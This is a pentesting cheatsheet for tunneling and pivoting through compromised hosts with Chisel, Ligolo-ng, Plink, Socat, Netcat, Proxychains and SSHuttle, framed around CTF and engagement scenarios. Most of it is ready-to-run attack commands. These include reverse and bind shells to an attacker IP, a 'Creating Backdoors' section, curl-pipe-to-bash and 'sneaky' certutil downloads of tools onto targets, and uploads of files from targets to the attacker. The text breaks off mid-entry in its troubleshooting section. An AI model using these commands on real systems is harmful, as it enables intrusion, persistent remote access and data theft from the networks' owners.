---
title: "Tunneling"
description: "tunneling-tools/ ├── chisel/ # TCP/UDP tunnel over HTTP (Fast SOCKS proxy) ├── ligolo-ng/ # Advanced TUN-based tunneling (VPN-like, no SOCKS needed!) ├──…"
category: tunneling-pivoting
tags: ["tunneling-pivoting", "relay", "pivoting", "tunneling"]
tools: ["Nmap", "Impacket", "Metasploit", "Chisel", "Ligolo-ng"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Misc/Tunneling.md"
---
# Tunneling Tools Cheatsheet

## Quick Reference Table

| Tool | Best For | Requires Root | Stealthy | Multi-Platform |
|------|----------|---------------|----------|----------------|
| **Ligolo-ng** | Full network pivoting | Only on attacker | High | ✅ |
| **Chisel** | Quick SOCKS proxy | No | Medium | ✅ |
| **SSHuttle** | VPN-like tunneling | Yes (attacker) | High | Linux/Mac |
| **Plink** | Windows SSH tunneling | No | High | Windows only |
| **Socat** | Port forwarding/relays | No | High | Linux/Windows |
| **Netcat** | Simple port forwarding | No | Medium | ✅ |
| **Proxychains** | Route tools via proxy | No | N/A | Linux/Mac |

## Installed Tools Location
```
tunneling-tools/
├── chisel/          # TCP/UDP tunnel over HTTP (Fast SOCKS proxy)
├── ligolo-ng/       # Advanced TUN-based tunneling (VPN-like, no SOCKS needed!)
├── plink/           # SSH client for Windows (PuTTY Link)
├── socat/           # Multipurpose relay (Port forwarding, shell upgrades)
├── nc/              # Netcat (ncat) - Classic networking swiss army knife
├── proxychains/     # Route tools through SOCKS/HTTP proxies (Install via brew)
└── sshuttle/        # VPN over SSH (Install via brew)
```

---

## CHISEL
**Best for:** Quick SOCKS proxy setup, HTTP-based tunneling (bypasses restrictive firewalls)

### Start Server (Attack Box)
```bash
# macOS (Apple Silicon)
./chisel/macos/chisel_darwin_arm64 server -p 8080 --reverse

# macOS (Intel)
./chisel/macos/chisel_darwin_amd64 server -p 8080 --reverse

# Linux
./chisel/linux/chisel_linux_amd64 server -p 8080 --reverse

# With authentication (recommended)
./chisel server -p 8080 --reverse --auth user:password

# Verbose mode (see connections)
./chisel server -p 8080 --reverse -v
```

### Connect Client (Target)
```bash
# Linux - Reverse SOCKS proxy
./chisel_linux_amd64 client ATTACK_IP:8080 R:1080:socks

# Windows - Reverse SOCKS proxy
chisel_windows_amd64.exe client ATTACK_IP:8080 R:1080:socks

# With authentication
./chisel client --auth user:password ATTACK_IP:8080 R:1080:socks

# Multiple port forwards
./chisel client ATTACK_IP:8080 R:1080:socks R:8888:localhost:80 R:3389:10.10.10.5:3389
```

### Common Chisel Patterns
```bash
# Reverse SOCKS (most common - access target's network from attacker)
chisel client ATTACK_IP:8080 R:1080:socks

# Forward specific port (expose target's service on attacker)
chisel client ATTACK_IP:8080 R:8888:127.0.0.1:80

# Local SOCKS (less common - access attacker's network from target)
chisel client ATTACK_IP:8080 1080:socks

# Remote forward with specific bind address
chisel client ATTACK_IP:8080 R:0.0.0.0:9999:localhost:80
```

### Usage with Proxychains
```bash
# After establishing SOCKS proxy on port 1080
proxychains4 nmap -sT -Pn 10.10.10.0/24
proxychains4 curl http://internal-server
proxychains4 firefox  # Browse internal web apps
```

---

## LIGOLO-NG
**Best for:** Full network pivoting without SOCKS, TUN-based (works like a VPN), automatic routing

### Setup TUN Interface (Attack Box - One Time Setup)

#### Linux
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

#### macOS
```bash
# Install tuntaposx if needed
brew install --cask tuntap

# Create interface (done automatically by ligolo-ng on macOS)
```

#### Windows
```powershell
# Ligolo-ng handles TUN interface automatically on Windows
# Run as Administrator
```

### Start Proxy (Attack Box)
```bash
# Linux
./ligolo-ng/linux/proxy -selfcert -laddr 0.0.0.0:11601

# macOS
./ligolo-ng/macos/proxy -selfcert -laddr 0.0.0.0:11601

# With custom certificate
./proxy -certfile server.crt -keyfile server.key -laddr 0.0.0.0:11601

# Enable autoroute (automatically adds routes - v0.8+)
./proxy -selfcert -laddr 0.0.0.0:11601 -autoroute

# With Web UI (multiplayer mode - v0.8+)
./proxy -selfcert -laddr 0.0.0.0:11601 -api 127.0.0.1:8080
```

### Connect Agent (Target)
```bash
# Linux
./agent -connect ATTACK_IP:11601 -ignore-cert

# Windows
agent.exe -connect ATTACK_IP:11601 -ignore-cert

# With specific network interface
./agent -connect ATTACK_IP:11601 -ignore-cert -bind 192.168.1.10

# Retry connection on failure
./agent -connect ATTACK_IP:11601 -ignore-cert -retry
```

### Ligolo Console Commands
```
# Session management
session                                      # List all connected sessions
session <id>                                 # Select a session
info                                         # Show session info

# Network discovery
ifconfig                                     # Show target's network interfaces
listener_list                                # Show active listeners

# Tunneling
start                                        # Start the tunnel
stop                                         # Stop the tunnel

# Port forwarding (reverse - opens port on target)
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
listener_add --addr 10.10.10.5:80 --to 192.168.1.100:8080
listener_stop <id>                           # Stop a listener

# Remote agent control
agent_kill                                   # Remotely terminate the agent
```

### Add Routes (Attack Box)

#### Linux
```bash
# Add route for internal network
sudo ip route add 10.10.10.0/24 dev ligolo

# Add multiple routes
sudo ip route add 172.16.0.0/16 dev ligolo
sudo ip route add 192.168.50.0/24 dev ligolo

# View routes
ip route | grep ligolo
```

#### macOS
```bash
# Add route
sudo route add -net 10.10.10.0/24 -interface utun
# Note: utun interface number may vary (utun5, utun6, etc.)
# Check with: ifconfig | grep utun

# Delete route
sudo route delete 10.10.10.0/24
```

#### Windows
```powershell
# Add route
route add 10.10.10.0 mask 255.255.255.0 10.0.0.1

# View routes
route print
```

### Complete Workflow Example
```bash
# 1. Start proxy on attacker
./proxy -selfcert -laddr 0.0.0.0:11601 -autoroute

# 2. Run agent on compromised host
./agent -connect ATTACKER_IP:11601 -ignore-cert

# 3. In ligolo console
ligolo-ng » session                    # See connected agent
ligolo-ng » session 1                  # Select the agent
[Agent] ligolo-ng » ifconfig           # View target networks
[Agent] ligolo-ng » start              # Start tunnel

# 4. Add routes (if not using autoroute)
sudo ip route add 172.16.5.0/24 dev ligolo

# 5. Access internal network directly
nmap -sT -Pn 172.16.5.0/24             # No proxychains needed!
ssh user@172.16.5.10
curl http://172.16.5.50:8080
```

### Double Pivoting (Pivot through multiple networks)
```bash
# Network topology: Attacker -> Host1 -> Host2 -> Target Network

# 1. Setup pivot on Host1
./agent -connect ATTACKER_IP:11601 -ignore-cert

# 2. From attacker, add route to Host1's network
sudo ip route add 192.168.100.0/24 dev ligolo

# 3. Setup listener on Host1 for Host2 to connect back
listener_add --addr 192.168.100.50:11601 --to ATTACKER_IP:11601

# 4. From Host2, connect through Host1
./agent -connect 192.168.100.50:11601 -ignore-cert

# 5. Add route to Host2's network
sudo ip route add 10.20.30.0/24 dev ligolo
```

---

## PLINK (Windows SSH Client)
**Best for:** SSH tunneling from Windows targets (no installation needed, single executable)

### Prerequisites
```bash
# On attack box, enable SSH password authentication
sudo vim /etc/ssh/sshd_config
# Set: PasswordAuthentication yes
sudo systemctl restart sshd

# Create user for tunneling
sudo useradd -m tunneluser
sudo passwd tunneluser
```

### Reverse SSH Tunnel (Expose target service on attacker)
```cmd
# Expose target's localhost:80 on attacker's port 9999
plink.exe -R 9999:127.0.0.1:80 user@ATTACK_IP -pw password

# Expose target's RDP to attacker
plink.exe -R 3389:127.0.0.1:3389 user@ATTACK_IP -pw password

# Expose internal network service
plink.exe -R 8080:10.10.10.50:80 user@ATTACK_IP -pw password

# Background execution (no window)
plink.exe -ssh -N -R 9999:127.0.0.1:80 user@ATTACK_IP -pw password
```

### Dynamic SOCKS Proxy (Access target's network from attacker)
```cmd
# Creates SOCKS proxy on attacker's port 1080
plink.exe -D 1080 user@ATTACK_IP -pw password

# Headless mode
plink.exe -N -D 1080 user@ATTACK_IP -pw password
```

### Local Port Forward (Access attacker's service from target)
```cmd
# Forward local 8080 to internal service
plink.exe -L 8080:INTERNAL_IP:80 user@ATTACK_IP -pw password

# Access attacker's tool on target
plink.exe -L 9001:ATTACK_IP:9001 user@ATTACK_IP -pw password
```

### Persistence & Stealth
```cmd
# Run in background (no console)
start /B plink.exe -N -R 9999:127.0.0.1:80 user@ATTACK_IP -pw password

# Auto-accept host key (first connection)
echo y | plink.exe -R 9999:127.0.0.1:80 user@ATTACK_IP -pw password

# Using SSH key instead of password
plink.exe -i private_key.ppk -R 9999:127.0.0.1:80 user@ATTACK_IP
```

---

## SOCAT
**Best for:** Port forwarding, shell upgrades, creating relays, encrypted tunnels

### Basic Port Forwarding
```bash
# Forward local 8080 to remote host (TCP)
./socat_linux_x64 TCP-LISTEN:8080,fork TCP:TARGET_IP:80

# UDP port forward
./socat_linux_x64 UDP-LISTEN:53,fork UDP:DNS_SERVER:53

# Bind to specific interface
./socat_linux_x64 TCP-LISTEN:8080,bind=192.168.1.10,fork TCP:TARGET_IP:80

# IPv6 forwarding
socat TCP6-LISTEN:8080,fork TCP6:[fe80::1]:80
```

### Reverse Shell Relay (Pivot through host)
```bash
# On pivot host - relay connections to attacker
./socat_linux_x64 TCP-LISTEN:4444,fork TCP:ATTACK_IP:4444

# Victim connects to pivot
bash -i >& /dev/tcp/PIVOT_IP/4444 0>&1

# Attacker receives shell
nc -lvnp 4444
```

### TTY Shell Upgrade (Fully Interactive Shell)
```bash
# Step 1: Attacker - prepare listener
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Step 2: Target - connect with PTY
./socat_linux_x64 exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACK_IP:4444

# Result: Full TTY with job control, tab completion, clear screen, etc.
```

### Encrypted Tunnels (OpenSSL)
```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 365 -out bind.crt
cat bind.key bind.crt > bind.pem

# Listener (encrypted)
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash

# Client (connect)
socat - OPENSSL:TARGET_IP:4443,verify=0
```

### File Transfers
```bash
# Sender
socat TCP-LISTEN:9999,reuseaddr FILE:file.zip

# Receiver
socat TCP:SENDER_IP:9999 CREATE:received.zip
```

### Port Scanning with Socat
```bash
# Simple port check
socat - TCP:TARGET:80,connect-timeout=1

# Banner grabbing
echo "" | socat - TCP:TARGET:22,connect-timeout=1
```

### Creating Reverse Shells
```bash
# Bind shell (target)
socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Reverse shell (target to attacker)
socat EXEC:/bin/bash TCP:ATTACK_IP:4444

# Windows reverse shell
socat TCP:ATTACK_IP:4444 EXEC:'cmd.exe',pipes
```

---

## NETCAT (NCAT)
**Best for:** Quick port forwarding, simple relays, port scanning, basic file transfers

### Basic Port Forwarding
```bash
# Simple TCP relay (pivot)
mkfifo /tmp/f; cat /tmp/f | nc TARGET_IP 80 | nc -l -p 8080 > /tmp/f

# Persistent relay (using while loop)
while true; do nc -l -p 8080 -c "nc TARGET_IP 80"; done
```

### Reverse Shell Relay
```bash
# On pivot host - relay to attacker
mkfifo /tmp/f; nc ATTACK_IP 4444 < /tmp/f | nc -l -p 9999 > /tmp/f

# Victim connects to pivot:9999
# Attacker gets shell on 4444
```

### File Transfers
```bash
# Receiver (start first)
./ncat_linux_x64 -l -p 9999 > received_file.zip

# Sender
./ncat_linux_x64 TARGET_IP 9999 < file.zip

# With progress (using pv)
pv file.zip | nc TARGET_IP 9999
```

### Port Scanning
```bash
# Check single port
nc -zv TARGET_IP 80

# Scan range
nc -zv TARGET_IP 20-25

# Banner grabbing
echo "" | nc -v -n -w1 TARGET_IP 22
```

### Creating Backdoors
```bash
# Bind shell (target)
./ncat_linux_x64 -l -p 5555 -e /bin/bash

# Reverse shell (target to attacker)
./ncat_linux_x64 ATTACK_IP 4444 -e /bin/bash

# Windows reverse shell
ncat.exe ATTACK_IP 4444 -e cmd.exe
```

### Chat/Communication Channel
```bash
# Listener
nc -l -p 4444

# Client
nc TARGET_IP 4444
# Type messages, they appear on both sides
```

---

## PROXYCHAINS (Install Required)
**Best for:** Routing any tool through SOCKS/HTTP proxies (pairs well with Chisel/SSH)

### Installation
```bash
# macOS
brew install proxychains-ng

# Kali Linux / Debian / Ubuntu
sudo apt install proxychains4 -y

# Arch Linux
sudo pacman -S proxychains-ng
```

### Config File Locations
```
# macOS (Homebrew)
/opt/homebrew/etc/proxychains.conf      # Apple Silicon
/usr/local/etc/proxychains.conf         # Intel Mac

# Linux
/etc/proxychains.conf                   # System-wide (older version)
/etc/proxychains4.conf                  # proxychains-ng (newer)
~/.proxychains/proxychains.conf         # User config (highest priority)

# Kali Linux
/etc/proxychains4.conf
```

### Configuration Examples
```bash
# Edit config file
sudo nano /etc/proxychains4.conf

# Basic SOCKS5 proxy (Chisel default)
[ProxyList]
socks5 127.0.0.1 1080

# SOCKS4 proxy
socks4 127.0.0.1 1080

# HTTP proxy
http 127.0.0.1 8080

# Chain multiple proxies
socks5 127.0.0.1 1080
socks5 10.10.10.5 1081
http 172.16.0.1 3128

# Proxy with authentication
socks5 127.0.0.1 1080 username password
```

### Proxy Modes (in config file)
```bash
# Dynamic chain (dead proxies auto-skipped)
dynamic_chain

# Strict chain (all proxies must work)
strict_chain

# Random chain (randomize proxy order)
random_chain
# random_chain = 2  # Use 2 random proxies from list
```

### Common Usage
```bash
# Nmap through proxy (use -sT for TCP connect scan)
proxychains4 nmap -sT -Pn 10.10.10.0/24

# SSH to internal host
proxychains4 ssh user@internal_host

# Web requests
proxychains4 curl http://internal-web
proxychains4 wget http://internal-site/file.zip

# Firefox browser (browse internal web apps)
proxychains4 firefox

# RDP through proxy
proxychains4 xfreerdp /v:10.10.10.5 /u:admin

# Metasploit through proxy
proxychains4 msfconsole
```

### Quiet Mode (Suppress Proxychains Output)
```bash
# Add to config file
quiet_mode

# Or use -q flag
proxychains4 -q nmap -sT 10.10.10.0/24
```

### Custom Config File
```bash
# Use specific config
proxychains4 -f /path/to/custom.conf curl http://target

# Example custom config
cat << EOF > /tmp/proxy.conf
strict_chain
quiet_mode
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f /tmp/proxy.conf nmap -sT 10.10.10.5
```

### DNS Configuration
```bash
# In config file:
proxy_dns  # Route DNS through proxy (default, recommended)

# Or disable:
#proxy_dns  # Local DNS resolution
```

### Troubleshooting
```bash
# Test proxy connection
proxychains4 curl -I http://google.com

# Verbose mode (see all proxy operations)
# Comment out quiet_mode in config

# If "ERROR: ld.so: object 'libproxychains.so.3'" appears:
# Update config with correct lib path or reinstall proxychains
```

---

## SSHUTTLE (Install Required)
**Best for:** VPN-like tunneling over SSH (transparent proxying, no SOCKS needed!)

### Installation
```bash
# macOS
brew install sshuttle

# Kali Linux / Debian / Ubuntu
sudo apt install sshuttle -y

# Arch Linux
sudo pacman -S sshuttle

# Python pip
pip3 install sshuttle
```

### Basic Usage
```bash
# Route all private networks through pivot
sshuttle -r user@PIVOT_HOST 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16

# Route specific subnet
sshuttle -r user@PIVOT_HOST 10.10.10.0/24

# Multiple subnets
sshuttle -r user@PIVOT_HOST 10.10.10.0/24 192.168.1.0/24

# Route everything (0/0) - careful!
sshuttle -r user@PIVOT_HOST 0/0
```

### Advanced Options
```bash
# Exclude specific hosts/networks
sshuttle -r user@PIVOT_HOST 10.10.10.0/24 -x PIVOT_HOST -x 10.10.10.50

# Use SSH key
sshuttle -r user@PIVOT_HOST -e 'ssh -i /path/to/key' 10.10.10.0/24

# Specify SSH port
sshuttle -r user@PIVOT_HOST:2222 10.10.10.0/24

# Verbose mode (see connections)
sshuttle -r user@PIVOT_HOST 10.10.10.0/24 -vv

# DNS through tunnel
sshuttle -r user@PIVOT_HOST 10.10.10.0/24 --dns

# Auto detect and route all remote subnets
sshuttle -r user@PIVOT_HOST --auto-nets

# Exclude local DNS
sshuttle -r user@PIVOT_HOST 10.10.10.0/24 --dns --to-ns=8.8.8.8
```

### Daemon Mode (Background)
```bash
# Run in background
sshuttle -r user@PIVOT_HOST 10.10.10.0/24 -D

# View sshuttle processes
ps aux | grep sshuttle

# Kill sshuttle
pkill sshuttle
```

### Using Jump Hosts
```bash
# SSH through jump host
sshuttle -r user@FINAL_HOST -e 'ssh -J user@JUMP_HOST' 10.10.10.0/24

# Multiple hops
sshuttle -r user@HOST3 -e 'ssh -J user@HOST1,user@HOST2' 10.10.10.0/24
```

### Common Scenarios
```bash
# Lab/CTF environment
sshuttle -r user@jump.lab.local 10.0.0.0/8 --dns -vv

# Pentest engagement (exclude your C2 server)
sshuttle -r user@pivot 10.10.0.0/16 -x YOUR_C2_IP

# Access cloud internal networks
sshuttle -r ubuntu@bastion.aws.com 10.0.0.0/16 172.31.0.0/16

# Through compromised host with SSH
sshuttle -r root@compromised-host 192.168.100.0/24 --no-latency-control
```

### Troubleshooting
```bash
# Check firewall rules added by sshuttle
sudo iptables -L -t nat  # Linux
sudo pfctl -s all        # macOS

# If connection drops
sshuttle -r user@HOST 10.10.10.0/24 --no-latency-control

# Manually clean up if sshuttle crashes
sudo pkill sshuttle
sudo iptables -t nat -F  # Linux
sudo pfctl -F all        # macOS

# Test connectivity
ping 10.10.10.5          # After sshuttle is running
curl http://10.10.10.50:80
```

### Comparison with Other Tools
```
SSHuttle vs Ligolo-ng:
+ Simpler (just needs SSH)
+ No agent/binary on target
- Requires SSH access
- Slightly slower

SSHuttle vs Proxychains + Chisel:
+ Transparent (no proxychains needed)
+ Better performance
+ Simpler to use
- Requires SSH
```

---

## Quick Transfer Commands

### Start HTTP Server (Attacker)
```bash
# Python3 (default)
python3 -m http.server 8000

# Python3 on specific interface
python3 -m http.server 8000 --bind 192.168.1.10

# Python2
python -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000

# With authentication
python3 -m http.server 8000 --directory /path/to/files
```

### Download on Target

#### Linux
```bash
# wget
wget http://ATTACK_IP:8000/chisel_linux_amd64 -O /tmp/chisel && chmod +x /tmp/chisel

# curl
curl http://ATTACK_IP:8000/chisel_linux_amd64 -o /tmp/chisel && chmod +x /tmp/chisel

# curl with progress bar
curl -# http://ATTACK_IP:8000/file.zip -o /tmp/file.zip

# Download and execute in memory (be careful!)
curl http://ATTACK_IP:8000/script.sh | bash

# Using /dev/tcp if no tools available
cat < /dev/tcp/ATTACK_IP/8000 > /tmp/file
```

#### Windows PowerShell
```powershell
# Invoke-WebRequest (PowerShell 3.0+)
Invoke-WebRequest -Uri http://ATTACK_IP:8000/chisel.exe -OutFile C:\Windows\Temp\chisel.exe

# Short alias
iwr -uri http://ATTACK_IP:8000/file.zip -o C:\Temp\file.zip

# WebClient (older PowerShell)
(New-Object System.Net.WebClient).DownloadFile("http://ATTACK_IP:8000/chisel.exe", "C:\Temp\chisel.exe")

# certutil (sneaky, no PowerShell)
certutil -urlcache -f http://ATTACK_IP:8000/chisel.exe C:\Temp\chisel.exe

# bitsadmin
bitsadmin /transfer myDownload /download /priority high http://ATTACK_IP:8000/file.exe C:\Temp\file.exe
```

#### Windows CMD
```cmd
# PowerShell one-liner from CMD
powershell -c "Invoke-WebRequest -Uri 'http://ATTACK_IP:8000/file.exe' -OutFile 'C:\Temp\file.exe'"

# certutil
certutil.exe -urlcache -split -f http://ATTACK_IP:8000/file.exe C:\Temp\file.exe
```

### Upload from Target to Attacker

#### Using Netcat
```bash
# Attacker (receiver)
nc -lvnp 9999 > received_file.zip

# Target (sender)
cat file.zip | nc ATTACK_IP 9999
```

#### Using curl (POST)
```bash
# Attacker (receiver with python)
python3 -m uploadserver 8000

# Target (sender)
curl -X POST http://ATTACK_IP:8000/upload -F 'files=@/path/to/file.zip'
```

### SMB Transfer (Windows)

#### Setup SMB Server (Attacker - Linux)
```bash
# Using impacket
impacket-smbserver share /path/to/share -smb2support

# With authentication
impacket-smbserver share /path/to/share -smb2support -username user -password pass
```

#### Access SMB Share (Target - Windows)
```cmd
# List share
net view \\ATTACK_IP

# Copy from share
copy \\ATTACK_IP\share\chisel.exe C:\Temp\

# Execute from share (no copy)
\\ATTACK_IP\share\chisel.exe

# Mount share
net use Z: \\ATTACK_IP\share
net use Z: \\ATTACK_IP\share /user:user pass
```

### Base64 Transfer (Small Files)
```bash
# Encode on attacker
base64 -w0 chisel > chisel.b64

# Decode on target (Linux)
echo "BASE64_STRING" | base64 -d > chisel && chmod +x chisel

# Decode on target (Windows PowerShell)
[System.Convert]::FromBase64String("BASE64_STRING") | Set-Content -Path chisel.exe -Encoding Byte
```

---

## Common Pentesting Scenarios

### Scenario 1: Access Internal Network from Compromised DMZ Host

**Situation:** You compromised a Linux web server in DMZ (10.50.50.5), need to access internal network (192.168.10.0/24)

**Solution 1: Ligolo-ng (Best - No SOCKS needed)**
```bash
# On attacker
./ligolo-ng/linux/proxy -selfcert -laddr 0.0.0.0:11601 -autoroute

# On compromised DMZ host
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo console
session 1
start

# Add route (if autoroute not used)
sudo ip route add 192.168.10.0/24 dev ligolo

# Access internal network directly
nmap -sT 192.168.10.0/24
```

**Solution 2: Chisel + Proxychains (Fast to setup)**
```bash
# On attacker
./chisel server -p 8080 --reverse

# On DMZ host
./chisel client ATTACKER_IP:8080 R:1080:socks

# On attacker
proxychains4 nmap -sT 192.168.10.5
```

### Scenario 2: Windows Target with No Direct Outbound Access

**Situation:** Windows box can only reach another compromised Linux host (pivot), can't reach attacker directly

**Solution: Double Pivot with Chisel**
```bash
# Step 1: Setup Chisel on first pivot (Linux)
./chisel server -p 8080 --reverse

# Step 2: Windows connects to Linux pivot
chisel.exe client LINUX_PIVOT_IP:8080 R:1080:socks

# Step 3: On attacker, create another tunnel to reach Windows network via Linux pivot
ssh -L 9999:localhost:1080 user@LINUX_PIVOT_IP

# Step 4: Configure proxychains to use localhost:9999
# Then access Windows internal network
proxychains4 rdesktop INTERNAL_WINDOWS_IP
```

### Scenario 3: Expose Internal Service to Attacker

**Situation:** Internal MSSQL server at 172.16.5.10:1433, want to connect from attacker

**Solution 1: Chisel Reverse Port Forward**
```bash
# On attacker
./chisel server -p 8080 --reverse

# On compromised internal host
./chisel client ATTACKER_IP:8080 R:1433:172.16.5.10:1433

# On attacker, connect directly
mssqlclient.py sa:password@127.0.0.1:1433
```

**Solution 2: SSH Reverse Tunnel (if SSH available)**
```bash
# From compromised host
ssh -R 1433:172.16.5.10:1433 user@ATTACKER_IP

# On attacker
mssqlclient.py sa:password@127.0.0.1:1433
```

### Scenario 4: Port Forward Through Windows (No Custom Tools)

**Situation:** Compromised Windows server, need tunnel but can't upload tools

**Solution: Built-in Windows Port Forward (netsh)**
```cmd
# Forward local port 8080 to internal service
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.50

# View forwards
netsh interface portproxy show all

# Delete forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Scenario 5: Multiple Nested Networks (3+ Hops)

**Situation:** Attacker -> Host A (10.10.10.5) -> Host B (192.168.1.10) -> Target Network (172.16.0.0/24)

**Solution: Ligolo-ng Listener Chaining**
```bash
# Step 1: Connect Agent A to attacker
# On attacker
./proxy -selfcert -laddr 0.0.0.0:11601

# On Host A
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Step 2: In ligolo console, create listener on Host A for Host B
session 1
listener_add --addr 0.0.0.0:11601 --to ATTACKER_IP:11601
start

# Step 3: Add route to Host A network
sudo ip route add 192.168.1.0/24 dev ligolo

# Step 4: From Host B, connect through Host A
./agent -connect 192.168.1.10:11601 -ignore-cert

# Step 5: Select Host B session and add route
session 2
start
sudo ip route add 172.16.0.0/24 dev ligolo

# Access final target network
nmap 172.16.0.5
```

### Scenario 6: Catch Reverse Shell Through Tunnel

**Situation:** Need to catch a reverse shell from internal network host (no direct route)

**Solution: Ligolo-ng Listener (Reverse Port Forward)**
```bash
# Setup tunnel to internal network (as usual)
./proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo console, setup listener
session 1
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
start

# On attacker, setup nc listener
nc -lvnp 4444

# On target internal host, execute reverse shell to agent's IP
bash -i >& /dev/tcp/AGENT_IP/4444 0>&1

# Shell appears on attacker's nc listener!
```

### Scenario 7: Access Internal Web Application

**Situation:** Internal web app at http://intranet.local (192.168.5.50:80), want to browse from attacker

**Solution 1: Ligolo-ng (Direct Access)**
```bash
# Setup tunnel
./proxy -selfcert -laddr 0.0.0.0:11601 -autoroute
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Start tunnel
session 1; start

# Add to /etc/hosts
echo "192.168.5.50 intranet.local" | sudo tee -a /etc/hosts

# Browse directly
firefox http://intranet.local
```

**Solution 2: Chisel + Browser SOCKS Proxy**
```bash
# Setup chisel
./chisel server -p 8080 --reverse
./chisel client ATTACKER_IP:8080 R:1080:socks

# Configure Firefox SOCKS proxy:
# Preferences -> Network Settings -> Manual proxy
# SOCKS Host: 127.0.0.1, Port: 1080, SOCKS v5
# Browse to http://192.168.5.50
```

### Scenario 8: RDP to Windows Machine in Internal Network

**Situation:** Windows Server at 10.10.50.10, need RDP access

**Solution 1: Through SOCKS Proxy**
```bash
# Setup Chisel tunnel
./chisel server -p 8080 --reverse
./chisel client ATTACKER_IP:8080 R:1080:socks

# Use proxychains with RDP client
proxychains4 xfreerdp /v:10.10.50.10 /u:administrator /p:password /cert-ignore
```

**Solution 2: Direct Port Forward**
```bash
# Chisel reverse port forward
./chisel client ATTACKER_IP:8080 R:3389:10.10.50.10:3389

# Direct RDP connection
xfreerdp /v:127.0.0.1:3389 /u:administrator /p:password
```

---

## Tool Selection Guide

### When to Use Each Tool

#### Use LIGOLO-NG when:
- You need full network access (scanning, multiple services)
- Want transparent access without SOCKS/proxychains
- Have ability to upload agent binary
- Need clean, VPN-like experience
- Working with multiple nested networks
- Performance matters (faster than SOCKS)

#### Use CHISEL when:
- Need quick SOCKS proxy setup
- Working through HTTP-only egress
- Want to forward specific ports
- Can't use SSH
- Need cross-platform support
- Working on HTB/CTF (widely supported)

#### Use SSHUTTLE when:
- Target already has SSH running
- Don't want to upload any tools
- Need quick, transparent VPN-like access
- Working on Linux/Mac
- Want simple solution without agents

#### Use PLINK when:
- Target is Windows
- SSH server available on attacker
- Can't upload other tools (plink is well-known, less suspicious)
- Need quick reverse tunnel
- Working with older Windows systems

#### Use SOCAT when:
- Need encrypted tunnels (OpenSSL)
- Creating relay points
- Upgrading reverse shells to TTY
- Need UDP forwarding
- Want flexibility for custom scenarios

#### Use NETCAT when:
- Just need basic port forwarding
- Creating simple relays
- Quick file transfers
- Testing connectivity
- Available on target (often pre-installed)

#### Use PROXYCHAINS when:
- Already have SOCKS proxy (Chisel, SSH)
- Need to route tools that don't support proxies
- Want to chain multiple proxies
- Working with scanners/exploit tools

### Decision Tree

```
Do you have SSH access on target?
├── YES: Use SSHuttle (simplest) or SSH tunneling
└── NO: Continue...

Can you upload custom binaries?
├── YES: Continue...
│   ├── Need VPN-like full network access?
│   │   └── YES: Use Ligolo-ng (best performance)
│   └── Need SOCKS proxy or port forward?
│       └── YES: Use Chisel (most versatile)
└── NO: Continue...
    ├── Windows target?
    │   ├── Plink available? -> Use Plink
    │   └── Use netsh portproxy (built-in)
    └── Linux/Unix target?
        ├── Netcat available? -> Use Netcat relay
        ├── Socat available? -> Use Socat
        └── Bash only? -> Use /dev/tcp relay
```

### Performance Comparison

| Tool | Speed | Latency | Resource Usage | Stealth |
|------|-------|---------|----------------|---------|
| Ligolo-ng | Excellent | Low | Low | High |
| SSHuttle | Very Good | Low | Low | Very High |
| Chisel | Good | Medium | Low | Medium |
| SSH Tunnels | Very Good | Low | Low | Very High |
| Socat | Good | Low | Very Low | High |
| Netcat | Fair | Medium | Very Low | Medium |

---

## Troubleshooting

### Chisel Issues

**Problem: Client connects but SOCKS proxy doesn't work**
```bash
# Check if server is running with --reverse flag
./chisel server -p 8080 --reverse

# Verify SOCKS port is listening on attacker
ss -tlnp | grep 1080

# Test SOCKS proxy
curl --socks5 127.0.0.1:1080 http://internal-host
```

**Problem: Connection refused / Can't connect**
```bash
# Check firewall on attacker
sudo ufw allow 8080/tcp

# Verify chisel is listening
ss -tlnp | grep 8080

# Try different port (maybe 8080 is blocked)
./chisel server -p 443 --reverse
```

### Ligolo-ng Issues

**Problem: TUN interface not created**
```bash
# Linux - create manually
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Check if interface exists
ip addr show ligolo

# macOS - install tuntap
brew install --cask tuntap
```

**Problem: Can't add routes / routes not working**
```bash
# Check if tunnel is started
# In ligolo console: start

# Verify route
ip route | grep ligolo

# Check if interface is UP
ip link show ligolo

# Try deleting and re-adding route
sudo ip route del 10.10.10.0/24 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo
```

**Problem: Agent won't connect**
```bash
# Check firewall
sudo ufw allow 11601/tcp

# Verify proxy is listening
ss -tlnp | grep 11601

# Try binding to specific IP
./proxy -selfcert -laddr 0.0.0.0:11601

# On agent, try explicit bind
./agent -connect ATTACKER_IP:11601 -ignore-cert -bind 0.0.0.0
```

### SSH / SSHuttle Issues

**Problem: SSHuttle connection drops**
```bash
# Use --no-latency-control
sshuttle -r user@host 10.10.10.0/24 --no-latency-control

# Check SSH connection stability
ssh user@host 'while true; do date; sleep 5; done'
```

**Problem: SSH password authentication failed**
```bash
# Enable password auth on SSH server
sudo vim /etc/ssh/sshd_config
# Set: PasswordAuthentication yes
sudo systemctl restart sshd
```

### Proxychains Issues

**Problem: DNS leaks / DNS not working**
```bash
# In /etc/proxychains4.conf, ensure:
proxy_dns

# Or add to config:
